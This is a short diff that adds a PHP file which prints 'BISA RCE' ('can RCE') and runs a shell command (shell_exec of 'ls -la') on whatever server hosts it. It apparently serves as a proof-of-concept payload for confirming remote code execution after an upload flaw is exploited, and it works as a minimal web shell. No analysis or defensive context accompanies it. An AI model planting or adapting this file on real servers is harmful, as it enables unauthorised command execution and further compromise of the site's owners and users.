@@ -1,0 +1,8 @@
+<pre>
+<?php
+
+echo "BISA RCE";
+echo shell_exec("ls -la");
+
+?>
+</pre>
